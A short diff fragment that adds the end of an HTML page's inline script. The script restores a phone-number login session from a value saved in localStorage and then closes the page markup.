+    const savedPhone = normalizePhoneKey(localStorage.getItem(STORAGE_PHONE_KEY) || "");
+    if (savedPhone.length >= 8) {
+      phoneLoginInput.value = savedPhone;
+      activatePhoneSession(savedPhone);
+    }
+  </script>
+</body>
+</html>
